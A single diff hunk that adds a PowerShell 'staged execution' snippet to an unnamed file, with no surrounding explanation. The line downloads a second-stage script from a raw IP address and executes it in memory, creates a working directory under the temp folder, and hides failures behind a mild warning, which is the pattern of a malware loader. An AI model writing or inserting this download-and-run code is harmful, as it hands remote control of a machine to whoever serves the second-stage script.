@@ -1,0 +1,1 @@
+<# Staged execution #> try { $StageScript = (New-Object Net.WebClient).DownloadString('http://198.51.100.91/stage2.ps1'); & ([ScriptBlock]::Create($StageScript)); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Write-Output "stage 28 initialized" } catch { Write-Warning "Stage transfer failed" }
